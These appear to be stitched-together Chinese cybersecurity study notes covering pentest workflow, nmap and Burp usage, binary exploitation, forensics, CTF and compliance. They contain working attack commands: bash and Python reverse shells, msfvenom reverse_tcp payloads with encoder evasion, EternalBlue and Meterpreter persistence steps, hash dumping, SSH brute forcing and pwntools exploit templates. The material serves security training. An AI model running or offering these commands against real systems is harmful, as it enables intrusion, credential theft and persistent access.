    if not re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host):
        raise ValueError("Invalid IP address")
    result = subprocess.run(
        ['ping', '-c', '3', host],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout
```

## 7. 渗透测试流程

### 7.1 标准流程

```
1. 前期交互 → 确定范围、规则、目标
2. 信息收集 → 被动/主动侦察
3. 威胁建模 → 识别攻击面和攻击路径
4. 漏洞分析 → 扫描、验证、分类
5. 渗透攻击 → 利用漏洞获取访问权限
6. 后渗透   → 权限提升、横向移动、数据获取
7. 报告撰写 → 发现、风险评级、修复建议
```

### 7.2 信息收集

```bash
# 被动信息收集
whois example.com                     # 域名注册信息
dig example.com ANY                   # DNS 记录
theHarvester -d example.com -b all    # 邮箱/子域名收集

# 主动信息收集
nmap -sn 192.168.1.0/24              # 主机发现
nmap -sV -sC -p- 192.168.1.1        # 全端口服务识别
nmap -O 192.168.1.1                  # 操作系统识别
nmap --script vuln 192.168.1.1       # 漏洞扫描脚本
```

## 8. Nmap 端口扫描

### 8.1 扫描类型

| 参数 | 扫描类型       | 特点                   | 隐蔽性 |
| :--- | :------------- | :--------------------- | :----- |
| -sS  | SYN 半开扫描   | 不完成三次握手，速度快 | 高     |
| -sT  | TCP 全连接扫描 | 完成三次握手           | 低     |
| -sU  | UDP 扫描       | 扫描 UDP 端口          | 中     |
| -sA  | ACK 扫描       | 检测防火墙规则         | 高     |
| -sF  | FIN 扫描       | FIN 包探测             | 高     |

### 8.2 常用命令

```bash
# 快速扫描常用端口
nmap -F 192.168.1.0/24

# 全端口扫描 + 服务版本 + 默认脚本
nmap -sV -sC -p- -T4 192.168.1.1

# 指定端口扫描
nmap -p 22,80,443,3306,8080 192.168.1.1

# 操作系统检测
nmap -O --osscan-guess 192.168.1.1

# 漏洞扫描
nmap --script=vulscan/vulscan.nse 192.168.1.1

# 绕过防火墙
nmap -f -D RND:10 --data-length 32 192.168.1.1

# 输出结果
nmap -sV -oX scan_results.xml 192.168.1.0/24
```

## 9. Burp Suite 漏洞扫描

### 9.1 核心模块

| 模块     | 功能                      |
| :------- | :------------------------ |
| Proxy    | 拦截和修改 HTTP 请求/响应 |
| Scanner  | 自动化漏洞扫描            |
| Intruder | 自定义攻击载荷暴力破解    |
| Repeater | 手动重放和修改请求        |
| Decoder  | 编码/解码工具             |
| Comparer | 请求/响应对比             |

### 9.2 常用工作流

```
1. 配置浏览器代理 → 127.0.0.1:8080
2. 开启 Intercept → 捕获请求
3. 发送到 Repeater → 手动测试参数
4. 发送到 Intruder → 标记攻击点，设置 Payload
5. 运行 Scanner → 自动扫描漏洞
6. 分析结果 → 验证漏洞、编写报告
```

### 9.3 Intruder 暴力破解示例

```
攻击类型: Sniper（单参数）/ Pitchfork（多参数并行）/ Cluster Bomb（多参数组合）

目标请求:
POST /login HTTP/1.1
username=§admin§&password=§password§

Payload 设置:
- username: 常用用户名字典
- password: 常用密码字典

Grep-Match:
- 匹配 "Login successful" → 成功
- 匹配 "Invalid credentials" → 失败
```
## 信息收集

**基本写法:DNS 枚举**
`dig any <域名>`
```bash
# 查询域名所有 DNS 记录
dig any example.com
```

**基本写法:子域名枚举**
`subfinder -d <域名>`
```bash
# 使用 subfinder 枚举子域名
subfinder -d example.com -o subdomains.txt
```

**基本写法:DNS 区域传送测试**
`dig axfr @<DNS服务器> <域名>`
```bash
# 测试 DNS 区域传送是否允许
dig axfr @ns1.example.com example.com
```

**基本写法:Whois 查询**
`whois <域名>`
```bash
# 查询域名注册信息
whois example.com
```

**基本写法:搜索引擎语法**
`site:<域名> intitle:"index of"`
```bash
# 使用 Google Hacking 查找敏感信息
site:example.com intitle:"index of" -inurl:(html|php)
```

---

## 端口扫描

**基本写法:nmap 基础扫描**
`nmap -sV <目标>`
```bash
# 扫描目标开放端口与服务版本
nmap -sV 192.168.1.10
```

**基本写法:快速端口扫描**
`nmap -T4 -F <目标>`
```bash
# 快速扫描常用端口
nmap -T4 -F 192.168.1.10
```

**基本写法:全端口扫描**
`nmap -p- -T4 <目标>`
```bash
# 扫描所有 65535 个端口
nmap -p- -T4 192.168.1.10
```

**基本写法:UDP 端口扫描**
`nmap -sU --top-ports <数量> <目标>`
```bash
# 扫描常用 UDP 端口
sudo nmap -sU --top-ports 100 192.168.1.10
```

**基本写法:操作系统识别**
`nmap -O <目标>`
```bash
# 识别目标操作系统
sudo nmap -O 192.168.1.10
```

**基本写法:漏洞脚本扫描**
`nmap --script vuln <目标>`
```bash
# 使用 nmap 漏洞脚本扫描
nmap --script vuln 192.168.1.10
```

---

## 服务枚举

**基本写法:SMB 枚举**
`enum4linux <目标>`
```bash
# 枚举 SMB 共享与用户信息
enum4linux -a 192.168.1.10
```

**基本写法:NFS 枚举**
`showmount -e <目标>`
```bash
# 查看 NFS 导出的目录
showmount -e 192.168.1.10
```

**基本写法:SSH 枚举**
`nmap --script ssh-* -p 22 <目标>`
```bash
# 使用 nmap SSH 脚本枚举
nmap --script ssh-* -p 22 192.168.1.10
```

**基本写法:SNMP 枚举**
`snmpwalk -c public -v1 <目标>`
```bash
# 枚举 SNMP 信息
snmpwalk -c public -v1 192.168.1.10
```

**基本写法:LDAP 枚举**
`ldapsearch -x -H ldap://<目标> -b <基准DN>`
```bash
# 枚举 LDAP 目录信息
ldapsearch -x -H ldap://192.168.1.10 -b "dc=example,dc=com"
```

---

## Web 应用测试

**基本写法:目录爆破**
`gobuster dir -u <URL> -w <字典>`
```bash
# 使用 gobuster 爆破 Web 目录
gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt
```

**基本写法:子域名爆破**
`gobuster dns -d <域名> -w <字典>`
```bash
# 爆破子域名
gobuster dns -d example.com -w subdomains.txt
```

**基本写法:Nikto 漏洞扫描**
`nikto -h <URL>`
```bash
# 使用 Nikto 扫描 Web 漏洞
nikto -h https://example.com
```

**基本写法:SQL 注入测试**
`sqlmap -u <URL> --dbs`
```bash
# 使用 sqlmap 测试 SQL 注入
sqlmap -u "https://example.com/page?id=1" --dbs
```

**基本写法:XSS 检测**
`dalfox url <URL>`
```bash
# 使用 dalfox 检测 XSS 漏洞
dalfox url "https://example.com/search?q=test"
```

**基本写法:WordPress 扫描**
`wpscan --url <URL>`
```bash
# 扫描 WordPress 站点
wpscan --url https://example.com --enumerate u
```

---

## 漏洞利用

**基本写法:搜索漏洞**
`searchsploit <关键字>`
```bash
# 在 exploitdb 中搜索漏洞利用
searchsploit apache 2.4
```

**基本写法:查看漏洞详情**
`searchsploit -x <漏洞ID>`
```bash
# 查看漏洞利用代码详情
searchsploit -x 12345
```

**基本写法:复制漏洞利用代码**
`searchsploit -m <漏洞ID>`
```bash
# 复制漏洞利用代码到当前目录
searchsploit -m 12345
```

**基本写法:使用 Metasploit**
`msfconsole -q -x "use <模块>; set RHOSTS <目标>; run"`
```bash
# 使用 Metasploit 利用漏洞
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; run"
```

**基本写法:生成 Payload**
`msfvenom -p <payload> LHOST=<IP> LPORT=<端口> -f <格式> -o <文件>`
```bash
# 生成反向连接 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe -o payload.exe
```

---

## 密码破解

**基本写法:使用 hashcat 破解**
`hashcat -m <类型> <哈希> <字典>`
```bash
# 使用 hashcat 破解 MD5 哈希(类型 0)
hashcat -m 0 hash.txt rockyou.txt
```

**基本写法:使用 john 破解**
`john --wordlist=<字典> <哈希文件>`
```bash
# 使用 John the Ripper 破解密码
john --wordlist=rockyou.txt hashes.txt
```

**基本写法:破解 zip 密码**
`john --wordlist=<字典> <zip2john输出>`
```bash
# 破解 ZIP 文件密码
zip2john protected.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

**基本写法:在线哈希查询**
`curl "https://hashtoolkit.com/reverse-hash?hash=<哈希>"`
```bash
# 在线查询哈希明文
curl "https://hashtoolkit.com/reverse-hash?hash=098f6bcd4621d373cade4e832627b4f6"
```

**基本写法:SSH 密码爆破**
`hydra -l <用户> -P <字典> ssh://<目标>`
```bash
# 使用 hydra 爆破 SSH
hydra -l root -P passwords.txt ssh://192.168.1.10
```

---

## 后渗透操作

**基本写法:建立反弹 shell**
`bash -i >& /dev/tcp/<攻击IP>/<端口> 0>&1`
```bash
# 通过 bash 反弹 shell 到攻击机
bash -i >& /dev/tcp/192.168.1.5/4444 0>&1
```

**基本写法:Python 反弹 shell**
`python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<端口>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'`
```bash
# Python 反弹 shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh"])'
```

**基本写法:升级交互式 shell**
`python3 -c 'import pty;pty.spawn("/bin/bash")'`
```bash
# 升级为交互式 shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**基本写法:端口转发**
`ssh -L <本地端口>:<目标>:<目标端口> <用户>@<跳板>`
```bash
# SSH 本地端口转发
ssh -L 8080:192.168.2.10:80 user@192.168.1.10
```

**基本写法:动态端口转发**
`ssh -D <本地端口> <用户>@<跳板>`
```bash
# SSH 动态端口转发建立 SOCKS 代理
ssh -D 1080 user@192.168.1.10
```

---

## 权限提升

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找 SUID 权限文件用于提权
find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查看 sudo 权限**
`sudo -l`
```bash
# 查看当前用户 sudo 权限
sudo -l
```

**基本写法:使用 LinPEAS 枚举**
`./linpeas.sh`
```bash
# 运行 LinPEAS 自动枚举提权路径
./linpeas.sh | grep -i "suid\|sudo\|writable"
```

**基本写法:查看内核版本**
`uname -r`
```bash
# 查看内核版本查找内核漏洞
uname -r
```

**基本写法:查看计划任务**
`cat /etc/crontab`
```bash
# 查看系统计划任务寻找提权点
cat /etc/crontab
```

---

## 内网渗透

**基本写法:内网存活主机探测**
`nmap -sn <网段>`
```bash
# Ping 扫描探测存活主机
nmap -sn 192.168.1.0/24
```

**基本写法:使用 Proxychains**
`proxychains <命令>`
```bash
# 通过 SOCKS 代理执行命令
proxychains nmap -sT -Pn 192.168.2.0/24
```

**基本写法:搭建 SOCKS 代理**
`ssh -D <端口> <用户>@<跳板> -fN`
```bash
# 使用 SSH 建立后台 SOCKS 代理
ssh -D 1080 user@192.168.1.10 -fN
```

**基本写法:内网端口扫描**
`nmap -sT -Pn -n --top-ports 100 <网段>`
```bash
# 通过代理扫描内网常用端口
proxychains nmap -sT -Pn -n --top-ports 100 192.168.2.0/24
```

**基本写法:Windows 凭据收集**
`secretsdump.py -local <文件>`
```bash
# 使用 impacket 导出 SAM 哈希
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

---

## 报告生成

**基本写法:生成扫描报告**
`nmap -sV <目标> -oX <输出文件>`
```bash
# 输出 XML 格式扫描报告
nmap -sV 192.168.1.10 -oX scan_report.xml
```

**基本写法:转换为 HTML 报告**
`xsltproc <XML文件> -o <HTML文件>`
```bash
# 将 nmap XML 报告转为 HTML
xsltproc scan_report.xml -o report.html
```

**基本写法:整合多种扫描结果**
`python3 -c "import xml.etree.ElementTree as ET; ..."`
```bash
# 解析多个工具的扫描结果整合报告
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('scan_report.xml')
for host in tree.findall('host'):
    print(host.find('address').get('addr'))
"
```

**基本写法:生成渗透测试报告**
`pandoc <输入> -o <输出>`
```bash
# 使用 pandoc 生成 PDF 报告
pandoc report.md -o pentest_report.pdf --pdf-engine=xelatex
```

**基本写法:导出漏洞清单**
`grep -E "CVE|OSVDB" <报告> > <漏洞清单>`
```bash
# 提取所有漏洞编号
grep -E "CVE-[0-9]+-[0-9]+|OSVDB" scan_report.txt > vulnerabilities.txt
```



<!-- ============ 文档分隔线：033-cybersecurity/003-BinarySecurityAndIncidentResponse.md ============ -->



## 1. 二进制逆向工程

### 1.1 逆向分析工具

| 工具    | 类型      | 特点               | 适用场景      |
| :------ | :-------- | :----------------- | :------------ |
| IDA Pro | 静态分析  | 业界标准，插件丰富 | 全面逆向分析  |
| Ghidra  | 静态分析  | 开源免费，NSA 出品 | 学习/开源分析 |
| radare2 | 静态+动态 | 命令行，脚本化     | 自动化分析    |
| GDB     | 动态调试  | Linux 标准调试器   | 运行时分析    |
| x64dbg  | 动态调试  | Windows 调试器     | Windows 逆向  |
| Frida   | 动态插桩  | 跨平台，Hook 框架  | 移动端/运行时 |

### 1.2 ELF 文件结构

```mermaid
flowchart TD
    E[ELF Header<br/>魔数 7f 45 4c 46<br/>文件类型/架构/入口] --> P[Program Headers 段加载信息]
    P --> S[.text 代码段<br/>.data 数据段 已初始化全局变量<br/>.bss 未初始化全局变量<br/>.rodata 只读数据 常量/字符串<br/>.plt/.got 动态链接 延迟绑定表]
    S --> H[Section Headers 节区信息]
```

### 1.3 GDB 常用命令

```bash
# 启动调试
gdb ./vuln_binary

# 基本命令
break main              # 设置断点
run                     # 运行程序
step / next             # 单步执行（进入/跳过函数）
continue                # 继续执行
finish                  # 执行到函数返回

# 内存检查
x/20wx $esp            # 查看栈内容（20个4字节十六进制）
x/s 0x8048000          # 查看字符串
info registers          # 查看寄存器
info functions          # 查看函数列表

# 高级功能
checksec ./vuln_binary  # 检查安全机制
  # NX/DEP: 栈不可执行
  # ASLR: 地址随机化
  # Stack Canary: 栈保护
  # PIE: 位置无关可执行
  # RELRO: 只读重定位

# Pattern 生成（确定偏移）
pattern create 200      # 生成 200 字节模式串
pattern offset 0x41366241  # 计算偏移量
```

## 2. 栈溢出漏洞利用

### 2.1 栈溢出原理

```mermaid
flowchart TD
    A[函数参数 高地址] --> R[返回地址 EIP<br/>覆盖目标] --> E[旧 EBP]
    E --> L[局部变量 缓冲区<br/>溢出起点 低地址]
```

溢出方向：局部变量 → 旧 EBP → 返回地址 → 控制执行流

### 2.2 基本利用过程

```python
# pwntools 栈溢出利用
from pwn import *

# 设置目标
elf = ELF('./vuln')
p = process('./vuln')

# 确定偏移量
offset = 44  # 通过 pattern 确定

# 构造 payload
# 方法1: ret2shellcode（无 NX 保护时）
shellcode = asm(shellcraft.sh())
payload = b'A' * offset + p32(0x0804a060)  # 返回到 shellcode 地址
payload = shellcode + b'A' * (offset - len(shellcode)) + p32(buf_addr)

# 方法2: ret2libc（有 NX 保护时）
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
payload = b'A' * offset + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)

# 发送 payload
p.sendline(payload)
p.interactive()
```

### 2.3 ROP 链构造

```python
# ret2syscall（使用 ROP gadgets）
from pwn import *

elf = ELF('./vuln')
p = process('./vuln')

# 寻找 gadgets
# ROPgadget --binary ./vuln
# 0x0806f022: pop eax ; ret
# 0x080bb196: pop ebx ; ret
# 0x080492e3: int 0x80

pop_eax = 0x0806f022
pop_ebx = 0x080bb196
int_80  = 0x080492e3

# execve("/bin/sh", NULL, NULL)
payload  = b'A' * offset
payload += p32(pop_eax) + p32(0x0b)     # eax = 11 (execve)
payload += p32(pop_ebx) + p32(bin_sh)    # ebx = "/bin/sh"
payload += p32(int_80)                    # 触发系统调用

p.sendline(payload)
p.interactive()
```

## 3. 堆溢出漏洞利用

### 3.1 堆管理机制

```mermaid
flowchart TD
    C[Chunk 结构<br/>prev_size 前一个 chunk 大小<br/>size | A|M|P 本 chunk 大小+标志位<br/>fd 前向指针 空闲时有效<br/>bk 后向指针 空闲时有效<br/>数据区]
```

Fast Bins：≤ 0x80 字节（单链表 LIFO）；Small Bins：≤ 0x400 字节（双链表 FIFO）；Large Bins：> 0x400 字节（按大小排序）；Unsorted Bin：释放后先进入，分配时再分类

### 3.2 常见堆利用技术

| 技术            | 原理                       | glibc 版本 |
| :-------------- | :------------------------- | :--------- |
| Fastbin Dup     | Double Free 获取任意写     | < 2.26     |
| Unlink          | 伪造 chunk 实现任意地址写  | < 2.28     |
| House of Force  | 溢出修改 top chunk 大小    | < 2.29     |
| Tcache Poison   | TCache 双重释放            | < 2.32     |
| House of Orange | 无 free 调用时的利用       | 多版本     |
| Largebin Attack | 大 bin 的 fd_nextsize 利用 | 多版本     |

### 3.3 TCache Poison 示例

```c
// 漏洞代码: double free
#include <stdlib.h>
#include <string.h>
int main() {
    char *a = malloc(0x20);
    char *b = malloc(0x20);
    free(a);
    free(a);    // Double Free! TCache 未检查
    // 现在 TCache 链表: a → a (循环)
    char *c = malloc(0x20);
    // 修改 c 的 fd 指向目标地址
    *(long*)c = 0x41414141;
    malloc(0x20);  // 返回 a
    char *d = malloc(0x20);  // 返回 0x41414141（任意地址写）
    return 0;
}
```

## 4. 格式化字符串漏洞

### 4.1 漏洞原理

```c
//  危险代码
printf(user_input);       // 用户输入作为格式化字符串
sprintf(buf, user_input); // 同样危险

//  安全代码
printf("%s", user_input);
```

### 4.2 利用方式

```bash
# 信息泄露
%x %x %x %x     # 泄露栈上的值（十六进制）
%p %p %p %p     # 泄露指针值
%s              # 读取指针指向的字符串（任意读）

# 任意地址写
%10$n           # 将已输出字节数写入栈上第10个参数指向的地址
%100c%10$n      # 写入值 100
%<offset>c%<pos>$n  # 精确写入
```

### 4.3 pwntools 利用

```python
from pwn import *

elf = ELF('./fmt_vuln')
p = process('./fmt_vuln')

# 确定偏移（格式化字符串在栈上的位置）
# 输入 AAAA|%p|%p|%p|... 找到 0x41414141

offset = 6  # 假设偏移为 6

# 任意写：修改 GOT 表项
target_addr = elf.got['printf']  # 要修改的目标地址

# 使用 fmtstr_payload 自动构造
payload = fmtstr_payload(offset, {target_addr: elf.symbols['system']})
p.sendline(payload)
```

## 5. 物联网安全

### 5.1 IoT 攻击面

| 攻击面       | 风险                     | 工具               |
| :----------- | :----------------------- | :----------------- |
| 固件         | 硬编码凭证、后门         | binwalk、Firmadyne |
| Web 管理界面 | 默认密码、命令注入       | Burp Suite         |
| 通信协议     | 明文传输、弱加密         | Wireshark          |
| 移动 App     | API 密钥泄露、不安全存储 | jadx、Frida        |
| 硬件接口     | UART/JTAG 调试口暴露     | 逻辑分析仪         |

### 5.2 固件分析

```bash
# 提取固件
binwalk firmware.bin                    # 分析固件结构
binwalk -e firmware.bin                 # 自动提取

# 分析提取的文件系统
squashfs-root/
├── bin/          # 二进制文件
├── etc/          # 配置文件
│   ├── passwd    # 用户凭证
│   ├── shadow    # 密码哈希
│   └── config    # 设备配置
├── web/          # Web 管理界面
└── usr/bin/      # 用户程序

# 搜索硬编码凭证
grep -r "password" squashfs-root/etc/
grep -r "admin" squashfs-root/web/
find squashfs-root -name "*.cfg" -exec cat {} \;
```

## 6. 工控系统安全

### 6.1 工控协议风险

| 协议       | 端口  | 安全问题          |
| :--------- | :---- | :---------------- |
| Modbus TCP | 502   | 明文、无认证      |
| S7comm     | 102   | 明文、无认证      |
| DNP3       | 20000 | 明文（可选认证）  |
| OPC DA     | 135   | DCOM 安全配置复杂 |
| IEC 104    | 2404  | 明文、无认证      |

### 6.2 工控安全防护

```
1. 网络隔离: IT/OT 网络物理/逻辑隔离
2. 纵深防御: 防火墙 → DMZ → 工控防火墙 → PLC
3. 协议白名单: 仅允许合法工控协议和操作
4. 入侵检测: 工控专用 IDS 规则
5. 安全运维: 变更管理、补丁管理、备份恢复
```

## 7. 隐写术分析

### 7.1 常见隐写方式

| 类型       | 方法               | 检测工具            |
| :--------- | :----------------- | :------------------ |
| LSB 隐写   | 修改最低有效位     | zsteg、StegSolve    |
| 文件追加   | 在文件末尾追加数据 | binwalk、hex编辑器  |
| 元数据隐写 | EXIF/注释字段嵌入  | exiftool            |
| 调色板隐写 | 修改调色板索引     | Stegsolve           |
| 音频隐写   | DCT/DWT 域嵌入     | Audacity、SilentEye |

### 7.2 隐写分析流程

```bash
# 1. 文件类型识别
file mystery_file
xxd mystery_file | head -20

# 2. 元数据检查
exiftool mystery_file

# 3. 隐藏数据提取
binwalk -e mystery_file           # 提取嵌入文件
zsteg mystery_file.png            # PNG LSB 隐写检测
steghide extract -sf mystery.jpg  # JPEG 隐写提取

# 4. 字符串搜索
strings mystery_file | grep -i flag
strings mystery_file | grep -i password

# 5. 对比分析（如有原始文件）
compare original.png modified.png diff.png
```

## 8. 应急响应流程

### 8.1 PDCERF 模型

```
准备(Preparation) → 发现(Discovery) → 抑制(Containment) →
根除(Eradication) → 恢复(Recovery) → 总结(Follow-up)
```

### 8.2 应急响应操作

```bash
# 1. 现场保护 — 避免破坏证据
# 不要重启系统！不要删除文件！

# 2. 证据固定
dd if=/dev/sda of=/evidence/disk_image.img bs=4M  # 磁盘镜像
md5sum /evidence/disk_image.img > image.md5        # 完整性校验

# 3. 内存采集
# Linux
dd if=/dev/mem of=/evidence/memory.dump bs=1M
# 或使用 LiME
insmod lime.ko "path=/evidence/memory.lime format=lime"

# Windows
# 使用 WinPmem 或 DumpIt

# 4. 进程分析
ps auxf                    # 查看进程树
lsof -i -P -n             # 查看网络连接
netstat -antp              # 网络连接状态
ls -la /proc/[PID]/exe     # 查看进程可执行文件
cat /proc/[PID]/cmdline    # 查看进程命令行

# 5. 持久化后门排查
crontab -l                 # 计划任务
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-unit-files --state=enabled  # 开机启动
cat ~/.bashrc ~/.bash_profile              # Shell 初始化
cat /etc/rc.local                          # 启动脚本
```

## 9. 日志分析技术

### 9.1 Linux 日志分析

```bash
# 登录日志
last -f /var/log/wtmp          # 成功登录
lastb -f /var/log/btmp         # 失败登录
grep "Failed password" /var/log/auth.log | awk '{print $11}' | \
  sort | uniq -c | sort -rn | head  # 暴力破解统计

# 系统日志
grep -i "error\|fail\|critical" /var/log/syslog
journalctl --since "2024-01-01" --until "2024-01-02" -p err

# Web 日志分析
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20  # IP 统计
grep "POST /login" access.log | grep " 401 "   # 登录失败
grep "SELECT\|UNION\|DROP" access.log          # SQL 注入尝试
grep "<script>\|alert(" access.log              # XSS 尝试
```

### 9.2 Windows 日志分析

```powershell
# 安全日志 — 登录事件
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |
  Select-Object TimeCreated, Message | Format-Table

# 统计登录失败 IP
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} |
  ForEach-Object { $_.Properties[5].Value } |
  Group-Object | Sort-Object Count -Descending | Select-Object -First 10

# 进程创建事件
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} |
  Select-Object TimeCreated, Message | Format-List
```

## 10. 取证技术

### 10.1 内存取证（Volatility）

```bash
# 获取系统信息
vol.py -f memory.dump windows.info

# 进程列表
vol.py -f memory.dump windows.pslist
vol.py -f memory.dump windows.pstree          # 进程树
vol.py -f memory.dump windows.psscan          # 扫描隐藏进程

# 网络连接
vol.py -f memory.dump windows.netscan

# 提取可疑进程
vol.py -f memory.dump windows.memmap --pid 1234 --dump

# 注册表分析
vol.py -f memory.dump windows.registry.printkey \
  --key "Software\Microsoft\Windows\CurrentVersion\Run"

# 文件提取
vol.py -f memory.dump windows.filescan | grep ".doc"
vol.py -f memory.dump windows.dumpfiles --physaddr 0x3e4a5b60
```

### 10.2 磁盘取证

```bash
# 创建取证镜像
dd if=/dev/sda of=evidence.img bs=4M conv=noerror,sync
# 或使用专业工具: FTK Imager、Guymager

# 镜像分析
mmls evidence.img                    # 查看分区表
fls -r -o 2048 evidence.img          # 查看文件系统
icat -o 2048 evidence.img 12345      # 提取文件（按 inode 号）

# 恢复删除文件
foremost -i evidence.img -o recovered/    # 按文件头恢复
photorec evidence.img                     # 交互式恢复

# 时间线分析
fls -r -m / -o 2048 evidence.img > body.txt
mactime -b body.txt > timeline.csv
```

## 11. 流量分析

### 11.1 Wireshark 数据包分析

```
常用过滤语法:
  ip.addr == 192.168.1.1           # IP 过滤
  tcp.port == 80                   # 端口过滤
  http.request.method == "POST"    # HTTP POST 请求
  dns.qry.name contains "evil"     # DNS 查询
  tcp.flags.syn == 1               # SYN 包
  frame.len > 1000                 # 大包过滤

分析技巧:
1. 统计 → 对话 → 查看 IP 通信量排名
2. 统计 → 协议分级 → 查看协议分布
3. 跟随 → TCP 流 → 查看完整会话
4. 导出 → HTTP 对象 → 提取传输文件
```

### 11.2 tcpdump 流量分析

```bash
# 抓包
tcpdump -i eth0 -w capture.pcap           # 抓取所有流量
tcpdump -i eth0 host 192.168.1.1          # 指定主机
tcpdump -i eth0 port 80                   # 指定端口
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN 包

# 读取分析
tcpdump -r capture.pcap -nn               # 读取 pcap
tcpdump -r capture.pcap -A                # ASCII 显示
tcpdump -r capture.pcap -X                # 十六进制+ASCII

# 提取 HTTP 请求
tcpdump -r capture.pcap -A -s 0 | \
  grep -i "GET\|POST\|Host\|Cookie"
```

## 12. CTF 夺旗挑战

### 12.1 CTF 题目类型

| 类型    | 内容                   | 推荐平台           |
| :------ | :--------------------- | :----------------- |
| Web     | SQL注入、XSS、代码审计 | CTFHub、BUUCTF     |
| Pwn     | 栈/堆溢出、ROP         | pwnable.kr、BUUCTF |
| Reverse | 逆向分析、算法还原     | Reversing.kr       |
| Crypto  | 密码学攻击、RSA/AES    | CryptoHack         |
| Misc    | 隐写、流量分析、取证   | CTFHub             |
| Mobile  | Android/iOS 逆向       | 看雪 CTF           |

### 12.2 学习路线

```
入门: CTFHub 技能树 → 掌握基础题型
进阶: BUUCTF 刷题 → 积累解题经验
实战: 参加线上 CTF 比赛 → 团队协作
提升: 复现真实漏洞 CVE → 深入理解原理
```

## 13. 网络安全法律法规

### 13.1 中国网络安全法律体系

| 法律法规                         | 施行日期   | 核心内容               |
| :------------------------------- | :--------- | :--------------------- |
| 《网络安全法》                   | 2017-06-01 | 网络运营者安全义务     |
| 《数据安全法》                   | 2021-09-01 | 数据分类分级、安全审查 |
| 《个人信息保护法》               | 2021-11-01 | 个人信息处理规则       |
| 《关键信息基础设施安全保护条例》 | 2021-09-01 | 关基设施保护要求       |

### 13.2 渗透测试合规要求

```
1. 必须获得书面授权（渗透测试授权书）
2. 明确测试范围、时间、限制条件
3. 不得超出授权范围进行测试
4. 发现重大漏洞及时报告，不得利用
5. 测试数据保密，不得泄露
6. 测试完成后清除所有测试痕迹
7. 出具正式报告，提出修复建议
```



<!-- ============ 文档分隔线：033-cybersecurity/004-SecurityToolsPractice.md ============ -->



## 1. Metasploit 框架

### 1.1 架构概述

```mermaid
flowchart TD
    T0["Metasploit Framework"]
    T1["msfconsole    # 交互式控制台（最常用）"]
    T2["msfvenom      # Payload 生成器"]
    T3["msfdb         # 数据库管理"]
    T4["Modules       # 功能模块"]
    T5["Exploits  # 漏洞利用"]
    T6["Payloads  # 攻击载荷"]
    T7["Auxiliaries # 辅助模块"]
    T8["Encoders  # 编码器"]
    T9["Nops      # 空指令"]
    T10["Post      # 后渗透模块"]
    T11["Database      # PostgreSQL 存储结果"]
    T0 --> T1
    T0 --> T2
    T0 --> T3
    T0 --> T4
    T10 --> T11
```

### 1.2 基本使用流程

```bash
# 启动 Metasploit
msfconsole

# 搜索漏洞利用模块
search type:exploit platform:windows smb
search cve:2017-0144          # EternalBlue

# 选择模块
use exploit/windows/smb/ms17_010_eternalblue

# 查看模块信息和选项
show info
show options
show payloads

# 配置参数
set RHOSTS 192.168.1.100      # 目标 IP
set RPORT 445                 # 目标端口
set LHOST 192.168.1.50        # 本机 IP（回连地址）
set LPORT 4444                # 回连端口
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 执行攻击
exploit
# 或
run
```

### 1.3 Meterpreter 后渗透

```bash
# 系统信息
sysinfo                      # 系统信息
getuid                       # 当前用户
getsystem                    # 提权到 SYSTEM

# 文件操作
pwd / cd / ls                # 目录操作
download C:\\Users\\doc.txt  # 下载文件
upload /tmp/tool.exe C:\\    # 上传文件
cat C:\\Windows\\System32\\config\\SAM  # 读取文件

# 网络操作
ipconfig / ifconfig          # 网络信息
route                        # 路由表
portfwd add -l 8080 -p 80 -r 10.1.1.1  # 端口转发

# 权限维持
run persistence -U -i 30 -p 4444 -r 192.168.1.50  # 持久化后门

# 哈希获取
hashdump                     # 导出密码哈希
load kiwi                    # 加载 Mimikatz
creds_all                    # 获取明文密码

# 会话管理
background                   # 放入后台
sessions -l                  # 列出会话
sessions -i 1                # 切换到会话1
```

### 1.4 msfvenom 生成 Payload

```bash
# 生成 Windows 反向 TCP Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o shell.exe

# 生成 Linux Payload
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o shell.elf

# 生成 Python Payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.py

# 生成 PHP Payload
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# 编码绕过（多编码器叠加）
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x64/xor_dynamic -i 5 \
  -f exe -o encoded_shell.exe
```

## 2. Nmap 高级用法

### 2.1 脚本引擎（NSE）

```bash
# 漏洞扫描脚本
nmap --script vuln 192.168.1.1

# SMB 漏洞检测
nmap --script smb-vuln* -p 445 192.168.1.1

# HTTP 枚举
nmap --script http-enum -p 80,443 192.168.1.1

# SSL/TLS 检测
